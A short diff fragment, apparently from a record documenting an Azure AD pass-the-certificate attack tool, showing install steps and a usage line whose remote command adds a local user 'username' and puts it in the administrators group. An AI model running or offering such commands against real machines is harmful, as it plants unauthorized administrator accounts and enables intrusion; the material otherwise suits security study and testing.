@@ -12,6 +12,7 @@ output: '# Installation instructtions for the tool
 
   # pip3 install impacket minikerberos cryptography==3.1.1 pyasn1
 
+
   Main.py --usercert <username>@<tenant>.onmicrosoft.com.pfx --certpass AzureADCert
   --remoteip 10.10.10.10 --command "cmd.exe /c net user username Password@123 /add
   /Y && net localgroup administrators username /add"'
@@ -34,3 +35,5 @@ AdureADJoinedMachinePTC.py --usercert <username>@<tenant>.onmicrosoft.com.pfx --
 
 Main.py --usercert <username>@<tenant>.onmicrosoft.com.pfx --certpass AzureADCert --remoteip 10.10.10.10 --command "cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add"
 ```
+
+
